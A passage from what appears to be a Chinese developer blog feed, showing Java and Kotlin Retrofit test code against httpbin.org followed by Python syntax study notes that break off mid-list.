    @GET(&quot;&#x2F;&quot;)
    fun get(): Call&lt;ResponseBody&gt;

    @GET(&quot;&#x2F;get&quot;)
    fun get(@Query(&quot;name&quot;)name:String,@Query(&quot;content&quot;)content: String): Call&lt;HttpBinResponse&gt;

    @GET(&quot;&#x2F;get&quot;)
    fun get(@QueryName name:String): Call&lt;ResponseBody&gt;

    @POST(&quot;&#x2F;post&quot;)
    fun post(): Call&lt;ResponseBody&gt;

    @POST(&quot;&#x2F;post&quot;)
    @FormUrlEncoded
    fun post(@Field(&quot;name&quot;) name:String,@Field(&quot;content&quot;) content:String): Call&lt;ResponseBody&gt;

    @POST(&quot;&#x2F;post&quot;)
    @Multipart
    fun post(@Part(&quot;va&quot;) va:RequestBody,@Part(&quot;name\&quot;; filename=\&quot;name.png&quot;)name: File, @Part(&quot;name2\&quot;; filename=\&quot;name2.png&quot;)name2: File): Call&lt;ResponseBody&gt;
}
</code></pre>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">public class Main {

    private static ServiceInterface sServiceInterface = new Retrofit.Builder().baseUrl(ServiceInterface.Companion.getBASE_URL()).client(
            new OkHttpClient.Builder().addInterceptor(new Interceptor() {

                private volatile String host;

                public void setHost(String host) {
                    this.host = host;
                }

                @NotNull
                @Override
                public okhttp3.Response intercept(@NotNull Chain chain) throws IOException {
                        Request request = chain.request();
                    String host = this.host;
                    if (host != null) {
                        HttpUrl newUrl = request.url().newBuilder().host(host).build();
                        request = request.newBuilder().url(newUrl).build();
                    }
                    return chain.proceed(request);
                }
            }).build())
            .addCallAdapterFactory(RxJava2CallAdapterFactory.create())
            .addConverterFactory(ApiConverterFactory.create())
            .build().create(ServiceInterface.class);

    {
&#x2F;&#x2F;        System.setProperty(&quot;http.proxyHost&quot;, &quot;127.0.0.1&quot;);
&#x2F;&#x2F;        System.setProperty(&quot;https.proxyHost&quot;, &quot;127.0.0.1&quot;);
&#x2F;&#x2F;        System.setProperty(&quot;http.proxyPort&quot;, &quot;8888&quot;);
&#x2F;&#x2F;        System.setProperty(&quot;https.proxyPort&quot;, &quot;8888&quot;);
    }

    public static void main(String[] args) throws Exception {
    }

    &#x2F;**
     * Get请求,
     *&#x2F;
    @Test
    public void testGet(){
        String s = null;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.get().execute();
            s = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }

    &#x2F;**
     * Get请求下载，带有 @Streaming
     *&#x2F;
    @Test
    public void testGetDownload(){
        String url = &quot;https:&#x2F;&#x2F;www.httpbin.org&#x2F;image&#x2F;png&quot;;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.downloadFile(&quot;Range: bytes=0-&quot;,url).execute();
            BufferedSink sink = Okio.buffer(Okio.sink(new File(&quot;C:\\Users\\Administrator\\Desktop&quot;, &quot;testImage.png&quot;)));
            sink.writeAll(response.body().source());
            sink.close();
            System.out.println(&quot;req图片&quot;);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    &#x2F;**
     * Get请求,带有@QueryName ?name
     *&#x2F;
    @Test
    public void testGetQueryName(){
        String s = null;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.get(&quot;name&quot;).execute();
            s = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }

    &#x2F;**
     * Get请求,带有@Query ?name=value&amp;name2=value2
     *&#x2F;
    @Test
    public void testGetQuery(){
        String s = null;
        try {
            Response&lt;HttpBinResponse&gt; response = sServiceInterface.get(&quot;名字&quot;,&quot;内容&quot;).execute();
            s = response.body().getData();
            System.out.println(&quot;url=&quot;+new Gson().fromJson(s,HttpBinResponse.Entity.class).getUrl()+&quot; \n&quot;+s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    &#x2F;**
     * Post请求
     *&#x2F;
    @Test
    public void testPost(){
        String s = null;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.post().execute();
            s = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }

    &#x2F;**
     * Post请求，表单提交 @FormUrlEncoded @Field
     *&#x2F;
    @Test
    public void testPostFormUrlEncoded(){
        String s = null;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.post(&quot;名字&quot;,&quot;内容&quot;).execute();
            s = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }

    &#x2F;**
     * Post请求，多部分表单提交 @Multipart @Part
     *&#x2F;
    @Test
    public void testPostMultipart() {
        RequestBody aa = RequestBody.create(&quot;name=11&amp;value=22&quot;, MediaType.parse(&quot;text&#x2F;plain&quot;));
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.post(aa,new File(&quot;C:\\Users\\Administrator\\Desktop\\1.png&quot;),new File(&quot;C:\\Users\\Administrator\\Desktop\\2.png&quot;)).execute();
            String s = response.body().string();
            System.out.println(s);
            HttpBinResponse.Entity entity = new Gson().fromJson(s, HttpBinResponse.Entity.class);
            String name = entity.getFile().get(&quot;name&quot;).replace(&quot;data:image&#x2F;png;base64,&quot;,&quot;&quot;);
            File file = new File(&quot;C:\\Users\\Administrator\\Desktop\\multipart.png&quot;);
            FileOutputStream out = new FileOutputStream(file);
            out.write(Base64.getDecoder().decode(name));
            out.flush();
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">public class ApiConverterFactory extends Converter.Factory{

    public static ApiConverterFactory create(){
        return new ApiConverterFactory();
    }

    @Nullable
    @Override
    public Converter&lt;?, RequestBody&gt; requestBodyConverter(Type type, Annotation[] parameterAnnotations, Annotation[] methodAnnotations, Retrofit retrofit) {
        return new ApiRequestBodyConverter();
    }

    @Nullable
    @Override
    public Converter&lt;ResponseBody, ?&gt; responseBodyConverter(Type type, Annotation[] annotations, Retrofit retrofit) {
        return new ApiResponseBodyConverter();
    }
}
</code></pre>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">public class ApiRequestBodyConverter implements Converter&lt;File, RequestBody&gt; {
    @Nullable
    @Override
    public RequestBody convert(File value) throws IOException {
        if(value.getAbsolutePath().contains(&quot;.png&quot;)){
            RequestBody bodyParams = RequestBody.create(value,MediaType.parse(&quot;image&#x2F;png&quot;));
            return bodyParams;
        }
        return null;
    }
}
</code></pre>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">public class ApiResponseBodyConverter implements Converter&lt;ResponseBody, HttpBinResponse&gt; {

    @Nullable
    @Override
    public HttpBinResponse convert(ResponseBody value) throws IOException {
        String json = value.string();
        HttpBinResponse response = new HttpBinResponse();
        try{
            response.setCode(1);
            response.setMessage(&quot;Success&quot;);
            response.setData(json);
        }catch (Exception e){
            e.printStackTrace();
        }
        return response;
    }
}
</code></pre>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">public class HttpBinResponse {

    private String message;
    private int code;
    private Entity entity;
    private String data;

    public String getMessage() {
        return message;
    }

    public void setMessage(String message) {
        this.message = message;
    }

    public int getCode() {
        return code;
    }

    public void setCode(int code) {
        this.code = code;
    }

    public Entity getEntity() {
        return entity;
    }

    public void setEntity(Entity entity) {
        this.entity = entity;
    }

    public String getData() {
        return data;
    }

    public void setData(String data) {
        this.data = data;
    }

    public static class Entity{
        private Object args;
        private String data;
        private Map&lt;String,String&gt; files;
        private Map&lt;String,String&gt; form;
        private Map&lt;String,String&gt; headers;
        private String json;
        private String origin;
        private String url;

        public Object getArg() {
            return args;
        }

        public void setArg(Object arg) {
            args = arg;
        }

        public String getData() {
            return data;
        }

        public void setData(String data) {
            this.data = data;
        }

        public Map&lt;String,String&gt; getFile() {
            return files;
        }

        public void setFile(Map&lt;String,String&gt; file) {
            files = file;
        }

        public Map&lt;String, String&gt; getForm() {
            return form;
        }

        public void setForm(Map&lt;String, String&gt; form) {
            this.form = form;
        }

        public Map&lt;String, String&gt; getHeader() {
            return headers;
        }

        public void setHeader(Map&lt;String, String&gt; header) {
            headers = header;
        }

        public String getJson() {
            return json;
        }

        public void setJson(String json) {
            this.json = json;
        }

        public String getOrigin() {
            return origin;
        }

        public void setOrigin(String origin) {
            this.origin = origin;
        }

        public String getUrl() {
            return url;
        }

        public void setUrl(String url) {
            this.url = url;
        }

        @Override
        public String toString() {
            return &quot;Data{&quot; +
                    &quot;args=&quot; + args +
                    &quot;, data=&#x27;&quot; + data + &#x27;\&#x27;&#x27; +
                    &quot;, files=&quot; + files +
                    &quot;, form=&quot; + form +
                    &quot;, headers=&quot; + headers +
                    &quot;, json=&#x27;&quot; + json + &#x27;\&#x27;&#x27; +
                    &quot;, origin=&#x27;&quot; + origin + &#x27;\&#x27;&#x27; +
                    &quot;, url=&#x27;&quot; + url + &#x27;\&#x27;&#x27; +
                    &#x27;}&#x27;;
        }
    }
}
</code></pre>

    <div class="muted text-sm">
      <a title="2022-03-06" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/retrofityuan-ma-fen-xi-2-10-0-snapshot/">
        <time class="dt-published published" datetime="2022-03-06">2022.03.06</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;pythonyu-fa&#x2F;">Python语法</a> <a href="#index-7" id="index-7" class="zola-anchor"></a>
    </h2>
    <p>[TOC]</p>
<h2 id="zhu">注:<a class="zola-anchor" href="#zhu" aria-label="Anchor link for: zhu">🔗</a></h2>
<ul>
<li>跨行字符串使用<code>'''</code>表示</li>
<li><code>callable(object)</code>可调用对象判断函数，类是可调用对象，实例需要实现<code>__call__</code>方法</li>
<li>if条件句变式
<ul>
<li><code>&lt;A&gt; if &lt;B&gt; else &lt;C&gt;</code> 默认返回A,如果B为False返回C</li>
<li><code>if &lt;A&gt; is not &lt;B&gt;:</code> 字面意思A不是B,为True</li>
<li><code>if not &lt;A&gt;:</code> A是空(False),为True</li>
</ul>
</li>
<li>一个类中，相同方法名，后面方法覆盖前面方法</li>
<li>魔法方法
<ul>
<li><code>__setattr__</code> 拦截赋值 重写该方法，当实例对属性进行赋值时，会调用该方法</li>
<li><code>__getattr__</code> 拦截运算 重写该方法，当实例直接引用不能存在的属性时，会调用该方法</li>
</ul>
</li>
<li><code>//</code> ：做除法并返回不大于结果的整数</li>
<li><code>[cls(**r) for r in rs]</code>,cls表示类接收一个关键字参数，rs表示迭代器。
通过迭代器把关键字参数传入到cls中，然后返回一个list对象</li>
</ul>
<h2 id="1-zhi-xing-mo-shi">1.执行模式<a class="zola-anchor" href="#1-zhi-xing-mo-shi" aria-label="Anchor link for: 1-zhi-xing-mo-shi">🔗</a></h2>
<h3 id="1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi">1.交互式模式(直接输入，并解释)<a class="zola-anchor" href="#1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi" aria-label="Anchor link for: 1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi">🔗</a></h3>
<p><code>&gt;&gt;&gt;print("hello world")</code></p>
<h3 id="2-ming-ling-xing-mo-shi">2.命令行模式<a class="zola-anchor" href="#2-ming-ling-xing-mo-shi" aria-label="Anchor link for: 2-ming-ling-xing-mo-shi">🔗</a></h3>
<ul>
<li>
<p>2.1内置函数:</p>
<ul>
<li>
<p>I/O
input()
print()</p>
</li>
<li>
<p>Python3.x使用Unicode编码：
ord() #字符转为整数表示
chr() #整数转为字符表示
PS：ord('A') 输出65
chr(666) 输出'ʚ'</p>
</li>
<li>
<p>编码/解码
"ascii" 是bytes(字节方式,b前缀)，在bytes中，无法显示为ASCII字符的字节，用\x##显示。
"utf-8"
encode() #用什么编码,
decode() #用什么解码
PS： ‘A’.encode('ascii')输出b'A'</p>
</li>
<li>
<p>其他
len() #字符/字节长度
format() #格式化输出
help(&lt;func_name&gt;) #查看函数用法</p>
</li>
<li>
<p>重新加载模块</p>
</li>
</ul>
<pre><code>import importlib
importlib.reload(&lt;module_name&gt;)
</code></pre>
</li>
</ul>
<h2 id="2-yu-fa-guan-jian-zi">2.语法-关键字<a class="zola-anchor" href="#2-yu-fa-guan-jian-zi" aria-label="Anchor link for: 2-yu-fa-guan-jian-zi">🔗</a></h2>
<h3 id="2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan">2.1变量类型任意-动态语言，变量类型固定-静态语言<a class="zola-anchor" href="#2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan" aria-label="Anchor link for: 2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan">🔗</a></h3>
<ul>
<li>1.语句缩进风格，大小写区分</li>
<li>2.数据类型：
浮点型："2e5"表示 2*10的5次方，"2e-5" 表示2*10的-5次方
布尔型："True" 或 "False"
逻辑符号： "and"(与)、"or"(或)、"not"(非)
空值："None"</li>
<li>3.除法："//"表示除法最后结果只取整数部分</li>
</ul>
<h3 id="2-2ge-shi-hua-shu-chu">2.2格式化输出<a class="zola-anchor" href="#2-2ge-shi-hua-shu-chu" aria-label="Anchor link for: 2-2ge-shi-hua-shu-chu">🔗</a></h3>
<ul>
<li>1.使用 “%”
PS: print("Hello,%s"%'World',"ok%d"%3)
输出 Hello,World ok3</li>
<li>2.使用format(),使用占位符{0},{1}...
PS：print("{0},{1}".format('Hello','World'))</li>
</ul>
<h3 id="2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao">2.3  list(可变数组 <code>&lt;中括号&gt; []</code>)和tuple(不可变数组 <code>&lt;小括号&gt; ()</code>)<a class="zola-anchor" href="#2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao" aria-label="Anchor link for: 2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao">🔗</a></h3>
<ul>
<li>list相关
<ul>
<li>1.list定义：</li>
</ul>
<pre><code>num=[1,2,3]
num=[] (空数组)
</code></pre>
<ul>
<li>2.访问list：</li>
</ul>
<pre><code>num[0]输出 1
num[1]输出 2
num[-1]输出 3
num[-2]输出 2
num[-3]输出 1
num[-4]报错
</code></pre>
<ul>
<li>3.增加list元素：</li>
</ul>
<pre><code>num.append(&quot;a&quot;) 输出 [1,2,3,&#x27;a&#x27;]
num.insert(1,1.1) 输出 [1,1.1,2,3,&#x27;a&#x27;]
num.insert(-1,&#x27;last_1&#x27;) 输出[1,1.1,2,3,&#x27;last_1&#x27;,&#x27;a&#x27;]
</code></pre>
<ul>
<li>4.删除list元素：</li>
</ul>
<pre><code>num.pop()输出[1,1.1,2,3,&#x27;last_1&#x27;]
num.pop(1)输出[1,2,3,&#x27;last_1&#x27;]
num.pop(-1)输出[1,2,3]
</code></pre>
</li>
<li>tuple相关
<ul>
<li>1.tuple定义：</li>
</ul>
<pre><code>#没有&quot;增加&#x2F;删除&quot;方法,数组不变
num=[1,2]
finalNum=(1,2,num)
finalNum=()(空数组)
如果定义finalNum=(1)，python防止和表达式歧义，
规定finalNum变量表示数字1。
可以这样表示 finalNum=(1,)
</code></pre>
<ul>
<li>2.访问tuple：</li>
</ul>
<pre><code>finalNum[0]输出 1
finalNum[1]输出 2
finalNum[-1]输出 [1,2]
finalNum[-1][0] 输出 1
</code></pre>
</li>
</ul>
<h3 id="2-4-tiao-jian-pan-duan">2.4 条件判断<a class="zola-anchor" href="#2-4-tiao-jian-pan-duan" aria-label="Anchor link for: 2-4-tiao-jian-pan-duan">🔗</a></h3>
<ul>
<li>关键字 "if"、"else"、"elif"(else if 缩写)、<code>":"</code>(冒号)</li>
<li>格式<pre><code>&lt;条件判断&gt;:非零数值、非空字符串、非空数组 为True，否则 False
if&lt;条件判断&gt;: #要加冒号 &quot;:&quot;
	&lt;执行&gt;
elif&lt;条件判断&gt;:
	&lt;执行&gt;
else：
	&lt;执行&gt;
</code></pre>
</li>
<li>字符串不能和数字比较<pre><code>b = input() #input()返回是字符串类型，需要转为数字
b = int(b) #int()方法，转为整数
b&gt;100
</code></pre>
</li>
</ul>
<h3 id="2-5-xun-huan">2.5 循环<a class="zola-anchor" href="#2-5-xun-huan" aria-label="Anchor link for: 2-5-xun-huan">🔗</a></h3>
<ul>
<li><code>for &lt;指代变量&gt; in &lt;数组&gt;:</code><pre><code>range(100) #返回整数序列的range对象
list(range(100)) #转为数组表示[1,2,...,99]
</code></pre>
</li>
<li><code>while &lt;条件&gt;:&lt;缩进&gt; &lt;执行&gt;</code>
<code>break</code>   退出循环
<code>continue</code>  停止当前次执行，继续循环判断</li>
</ul>
<h3 id="2-6-shu-ju-ji-he-dict-he-set">2.6 数据集合：dict 和 set<a class="zola-anchor" href="#2-6-shu-ju-ji-he-dict-he-set" aria-label="Anchor link for: 2-6-shu-ju-ji-he-dict-he-set">🔗</a></h3>
<ul>
<li>
<p><code>dict</code> <code>&lt;大括号&gt; {}</code> (dictionary) <code>Java中的map</code></p>
<pre><code>d={&#x27;a&#x27;:1,&#x27;b&#x27;:2,&quot;c&quot;:3}
d[&#x27;a&#x27;] 输出 1
d[&#x27;a&#x27;] =&#x27;1a&#x27; #赋值
</code></pre>
<ul>
<li>是否存在key，返回 True 或 False</li>
</ul>
<pre><code>`&lt;key&gt; in &lt;dict&gt;`
`&lt;dict&gt;.get(&lt;key&gt;)` #不存在返回 None
`&lt;dict&gt;.get(&lt;key&gt;,&lt;defaultValue&gt;)` #不存在返回 &lt;defaultValue&gt;
</code></pre>
<ul>
<li>删除 <code>&lt;dict&gt;.pop(&lt;key&gt;)</code></li>
</ul>
</li>
<li>
<p><code>set</code> <code>&lt;小括号&gt; ()</code></p>
<pre><code>定义	:需要list数组
a = [1,2,3]
b=set(a) 或 b =set([1,2,3]) 
</code></pre>
<ul>
<li>add <code>&lt;set&gt;.add(&lt;key&gt;)</code></li>
<li>remove <code>&lt;set&gt;.remove(&lt;key&gt;)</code></li>
<li>逻辑操作 <code>&amp;</code>、<code>|</code> 、 <code>-</code></li>
</ul>
<pre><code>s1=([1,2,3])
s2=([2,3,4])
s1 &amp; s2 输出 {2,3}
s1 | s2 输出 {1,2,3,4}
s1 - s2 输出 {1}
</code></pre>
</li>
</ul>
<h3 id="2-7-han-shu">2.7 函数<a class="zola-anchor" href="#2-7-han-shu" aria-label="Anchor link for: 2-7-han-shu">🔗</a></h3>
<ul>
<li>1.函数定义：  <code>def</code> &lt;method_name&gt;(params)<code>:</code></li>
<li>2.空函数： <code>def</code> &lt;method_name&gt;()<code>:</code> <code>pass</code></li>
<li>3.return：
<ul>
<li>1.return表示结束,等价于 return None</li>
<li>2.不写默认返回 return None</li>
<li>3.返回tuple类型可省略<code>()</code>,PS: return (x,y) 变为 return x,y</li>
</ul>
</li>
<li>4.导入模块(.py文件)：
<ul>
<li>1.引入整个模块：<code>import</code> math 说明导入math包
PS:自定义文件tri.py，<code>import tri</code>引入tri文件到内存 通过 tri.&lt;mothod&gt;()访问</li>
<li>2.导入模块中的某个方法：
<ul>
<li>某个函数：  <code>from</code> &lt;文件名&gt; <code>import</code> &lt;函数名&gt;</li>
<li>全部函数：<code>from</code> &lt;文件名&gt; import *</li>
</ul>
</li>
</ul>
</li>
<li>5.参数：</li>
<li>
<ul>
<li>必选参数</li>
<li>1.默认参数，<code>参数</code>=<code>值</code></li>
<li><code>默认参数必须指向不变对象</code>，如果值是<code>[]</code>，那么每次调用都是原来的<code>[]</code></li>
</ul>
<pre><code>def power(x,n=2):
	pass
调用方式：
1.power(5),默认n=2
2.power(5,3)
</code></pre>
<ul>
<li>2.可变参数： <code>*</code>params</li>
</ul>
<pre><code>def count(*params):
	sum = 0;
	for p in params:
		sum = sum +p
	return sum
调用方式：
1.count(1) 输出 1
2.count(1,2,3) 输出 6
3.count(*[1,2,3]) 输出 6
</code></pre>
<ul>
<li>3.关键字参数： <code>**</code>params</li>
</ul>
<pre><code>def student(name,age,**params):
	print(&quot;name&quot;,name,&#x27;age&#x27;,age,&#x27;params&#x27;,params)
调用：
1.student(&#x27;a&#x27;,12) 输出  name a age 12 params {}
2.student(&#x27;b&#x27;,12,a=122,b=1223) 输出 name b age 12 params {&#x27;a&#x27;: 122, &#x27;b&#x27;: 1223}
3.student(1,2,**{&#x27;a&#x27;:2}) 输出 name 1 age 2 params {&#x27;a&#x27;: 2}
</code></pre>
<ul>
<li>4.命令关键字参数： <code>*,&lt;key1&gt;,&lt;key2&gt;</code> (PS:如果前面有可变参数，可不用加<code>*,</code>)</li>
</ul>
<pre><code>def student(name,age,*,gender,city):
	print(&#x27;name&#x27;,name,&#x27;age&#x27;,age,gender,city)
调用：
1.student(&#x27;a&#x27;,110) 输出 TypeError..
2.student(&#x27;a&#x27;,123,gender=&#x27;male&#x27;,city=&#x27;fz&#x27;) 输出 name 1 age 2 male fz
</code></pre>
<ul>
<li>5.参数组合：顺序- 必选参数-&gt;默认参数-&gt;可变参数-&gt;命令关键字参数-&gt;关键字参数</li>
</ul>
<pre><code>def s(a,b,c=0,*d,city,**kw):
	print(&#x27;a=&#x27;,a,&#x27;b=&#x27;,b,&#x27;c=&#x27;,c,&#x27;d=&#x27;,d,&#x27;city=&#x27;,city,&#x27;kw=&#x27;,kw)
调用：
1.s(1,2,city=22)
输出 a= 1 b= 2 c= 0 d= () city=22 kw= {}
2.s(1,2,3,4,5,city=22,a=1,b=2)	
输出 a= 1 b= 2 c= 3 d= (4, 5) city= 22 kw= {&#x27;d&#x27;: 1, &#x27;e&#x27;: 2}
3.s(1,2,3,4,5) 输出TypeError：missing city
</code></pre>
</li>
</ul>
<h3 id="2-8gao-ji-te-xing">2.8高级特性<a class="zola-anchor" href="#2-8gao-ji-te-xing" aria-label="Anchor link for: 2-8gao-ji-te-xing">🔗</a></h3>
<ul>
<li>1.切片(Slice)：取数组元素的简便方式
<ul>
<li>默认是索引0开始并且递增速度1,可反向索引</li>
<li><code>[0:3]</code>或<code>[:3]</code> 取数组 [0],[1],[2]</li>
<li><code>[-1:]</code> 取数组 [2]</li>
<li><code>[:]</code> 取全部</li>
<li><code>[::5]</code> 在全部中，每个5个取一个</li>
<li><code>[:10:2]</code> 在数组0~9的元素中每隔2个取一个</li>
</ul>
</li>
<li>2.列表生成式：列表的每个元素进行一次表达式计算
<ul>
<li>格式： <code>[&lt;变量的表达式&gt; for &lt;变量&gt; in &lt;序列&gt;]</code></li>
</ul>
<pre><code>def L2(L):
	L2 = []
	for x in L:
		L2.append(x*x)
	return L2
调用： [1,2,3] -&gt;[1,4,9]
1.sum2(list(range(1,4)))
2.列表生成式: [x*x for x in range(1,4)]
</code></pre>
</li>
<li>3.生成器(Generator)：动态生成列表的每个元素，可通过<code>next(&lt;Generator&gt;)</code>进行访问
<ul>
<li>1.列表表达式改为小括号 <code>(&lt;变量的表达式&gt; for &lt;变量&gt; in &lt;序列&gt;)</code></li>
<li>2.设置函数中的<code>yield</code>，变成一个Generator，函数每次调用返回一个新的Generator</li>
<li><code>g.send(&lt;参数&gt;)</code>:传入值，并调用<code>next(g)</code>,g=Generator</li>
<li>return时，StopIteration</li>
</ul>
<pre><code>杨辉三角： C(n,i)=C(n-1,i-1)+C(n-1,i)
递归关系式 (n&gt;1,1&lt;=i&lt;=n n表示行,i表示第n行的第i个数) C(1,1)=1
	def triangles():
	L = [1]
	while True:
		yield L
		L = [sum(i) for i in zip([0]+L,L+[0])] #补[0]作用：行项+1，每个项是[n-1,n]队列
</code></pre>
</li>
</ul>
<h3 id="2-9-han-shu-shi-bian-cheng">2.9 函数式编程<a class="zola-anchor" href="#2-9-han-shu-shi-bian-cheng" aria-label="Anchor link for: 2-9-han-shu-shi-bian-cheng">🔗</a></h3>
<ul>
<li>
<p>1.定义：一种抽象程度很高的程序范式，纯粹的函数式编程没有变量。任意函数输入确定，那么输出
也确定，称为没有副作用。对于有变量的相同输入，可能有不同输出，称为有副作用。</p>
</li>
<li>
<p>2.高阶函数：</p>
<ul>
<li>特点：
<ul>
<li>1.允许函数作为一个<code>变量</code>、函数<code>返回值</code>。</li>
<li>2.<code>函数名变量</code>：函数名作为变量</li>
<li>3.<code>函数参数</code>：可接收另一个函数作为参数</li>
</ul>
</li>
<li>map/reduce
<ul>
<li><code>map(&lt;method_name&gt;,&lt;Iterable&gt;)</code>
<code>return &lt;Iterator&gt;，需要list(&lt;Iterator&gt;)变为列表</code><br />
其中<code>&lt;Iterable&gt;</code>的每个元素都被<code>&lt;method_name&gt;</code>作用一次</li>
<li><code>reduce(&lt;method_name&gt;,&lt;Iterable&gt;)</code>
<ul>
<li>1.需要引入 <code>from functools import reduce</code></li>
<li>2.<code>&lt;method_name&gt;</code>需要2个参数，
返回的值继续和<code>&lt;Iterable&gt;</code>的下一个值进行函数计算</li>
</ul>
</li>
</ul>
</li>
<li>filter：<code>filter(&lt;method_name&gt;,&lt;Iterable&gt;)</code>和<code>map</code>函数类似
不同的是<code>&lt;method_name&gt;</code>根据返回True/False，<code>&lt;Iterable&gt;</code>过滤False的item</li>
<li>sorted: <code>sorted(&lt;Iterable&gt;,**kw)</code>，<code>&lt;Iterable&gt;</code>进行排序
其中<code>**kw</code>，可选择接受 <code>key=&lt;method_name&gt;</code>(PS:abs,str.lower)自定义排序，
reverse=True反向排序</li>
</ul>
</li>
<li>
<p>3.返回函数：</p>
<ul>
<li>返回函数，需要变量进行函数调用，每次调用返回新的函数</li>
<li>闭包：能够读取函数内部变量的函数（定义在函数内部的函数）
<code>返回函数不要引用引起变化的局部变量</code></li>
</ul>
</li>
<li>
<p>4.匿名函数：<code>lambda &lt;变量&gt;:&lt;表达式&gt;</code>只是个表达式，可被变量引用</p>
</li>
<li>
<p>5.装饰器：在原有函数定义不需要改变下，增加新内容并返回函数的引用</p>
<ul>
<li><code>__name__</code>函数名称</li>
<li>1.<code>@</code> 修饰符</li>
</ul>
<pre><code>def log(f):
	@functools.wraps(f)
	def wrapper(*args,**kw):
		print(&#x27;wrapper %s func&#x27;%f.__name__)
		return f(*args,**kw)
	return wrapper
@log
def now():
	print(&#x27;now&#x27;)
其中，@log修饰 等价于  now = log(now)
</code></pre>
<ul>
<li>2.原始函数的一些属性复制到装饰器函数
<ul>
<li>import functools</li>
<li>@functools.wraps(&lt;func_params&gt;)</li>
</ul>
</li>
</ul>
</li>
<li>
<p>6.偏函数：<code>functools.partial(&lt;method_name&gt;,*args,**kw)</code>
其中*args在前**kw在后</p>
<pre><code>import functools
int(&#x27;100&#x27;,2) 输出4
int(&#x27;100&#x27;,base=2) 输出4
int2 = functools.partial(int,base=2) #默认int函数是10进制
int2(&#x27;100&#x27;)输出4
PS:
int2 = functools.partial(int,2)?
int2(&#x27;100&#x27;) 输出 TypeError，因为调用int2(&#x27;100&#x27;) 等价于 int(2,&#x27;100&#x27;)
</code></pre>
<pre><code>functools.partial源码
def partial(func, *args, **keywords):
	def newfunc(*fargs, **fkeywords):
		newkeywords = keywords.copy()
        newkeywords.update(fkeywords)
        return func(*args, *fargs, **newkeywords)
    newfunc.func = func
    newfunc.args = args
    newfunc.keywords = keywords
    return newfunc
</code></pre>
</li>
</ul>
<h3 id="2-10-shi-yong-mo-kuai">2.10 使用模块<a class="zola-anchor" href="#2-10-shi-yong-mo-kuai" aria-label="Anchor link for: 2-10-shi-yong-mo-kuai">🔗</a></h3>
<ul>
<li>1.导入模块: PS:import sys 就可以使用sys变量来访问模块全部内容</li>
<li>2.模块内部：
<ul>
<li>
<p>1.模块特殊变量<code>__name__</code>，当运行当前模块文件<code>__name__</code> ==<code>__main__</code>是True，否则False</p>
<pre><code>hello.py

def test():
	print(&quot;hello world&quot;)
if __name__ ==&#x27;__main__&#x27;
	test()
当 python hello.py
	输出 hello world 
当 import hello 将不会执行 test()
</code></pre>
</li>
<li>
<p>2.类似<code>__xxx__</code>这样的变量是特殊变量，可以被直接引用，但是有特殊用途</p>
</li>
<li>
<p>3.类似<code>_xxx和__xxx</code>这样的变量或函数就是非公开的（private 模块内部使用）,规定不能访问</p>
</li>
<li>
<p>(只是内部改变了变量命名名称，python无法完全限制访问)</p>
</li>
</ul>
</li>
<li>3.安装第三方模块：pip install &lt;module_name&gt;
<ul>
<li>添加模块搜索路径</li>
</ul>
<pre><code>import sys
sys.path 查看模块
sys.path.append(&quot;路径&quot;)
</code></pre>
<ul>
<li>设置PYTHON_PATH</li>
</ul>
</li>
</ul>
<h3 id="2-11-mian-xiang-dui-xiang-bian-cheng">2.11 面向对象编程<a class="zola-anchor" href="#2-11-mian-xiang-dui-xiang-bian-cheng" aria-label="Anchor link for: 2-11-mian-xiang-dui-xiang-bian-cheng">🔗</a></h3>
<ul>
<li>1.类和实例
<ul>
<li>定义： <code>class &lt;class_name&gt;(object):</code> 表示<code>&lt;class_name&gt;</code>继承自object</li>
<li><code>__init__(self,params)</code> 对象创建时，如果必须传递的参数params，可以使用该方法</li>
<li>类的方法，第一个参数固定是self，其他和函数定义一样</li>
</ul>
</li>
<li>2.访问限制
<ul>
<li><code>__xx__</code>标识特殊变量，可以访问</li>
<li><code>__xx</code>标识变量，表示private,不允许访问</li>
<li><code>_xx</code>标识变量，约定成俗，表示private
(只是python解释器会把这种变量解释成不一样名称防止外部直接访问)</li>
</ul>
</li>
<li>3.继承和多态
<ul>
